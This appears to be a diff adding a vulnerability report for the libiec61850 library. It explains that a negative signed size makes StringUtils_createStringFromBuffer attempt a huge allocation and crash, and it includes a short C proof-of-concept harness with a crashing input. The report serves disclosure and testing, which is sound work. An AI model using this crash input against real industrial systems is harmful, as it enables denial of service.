@@ -1,0 +1,22 @@
+issue #198
+
+StringUtils_createStringFromBuffer's second argument is size which is a signed integer. If attacker supply a negtive number like -1, StringUtils_createStringFromBuffer will try to alloc a very large buffer that is size 0xffffffff in 32bit arch or 0xffffffffffffffff in 64 bit arch. Most of the time alloc will failed then memcpy will get segment fault.
+
+PoC
+
+#include <stdio.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <libiec61850/mms_value.h>
+uint8_t globalbuf[0x10000];
+int main(){
+    ssize_t readcount;
+    readcount = read(0, globalbuf, sizeof(globalbuf));
+    if( readcount <= 0 ){
+        return 0;
+    }
+    MmsValue *res = MmsValue_decodeMmsData(globalbuf, 0, (int)readcount, 0);
+    return 0;
+}
+
+<90><80>
